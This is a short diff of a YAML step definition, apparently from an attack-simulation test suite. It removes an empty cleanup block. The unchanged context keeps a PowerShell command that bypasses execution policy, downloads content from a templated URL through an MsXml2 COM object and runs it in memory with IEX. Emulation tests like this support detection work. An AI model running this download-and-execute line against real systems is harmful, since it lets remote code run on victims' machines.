@@ -24,6 +24,3 @@ steps:
       inline: |
         powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','{{.Args.url}}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
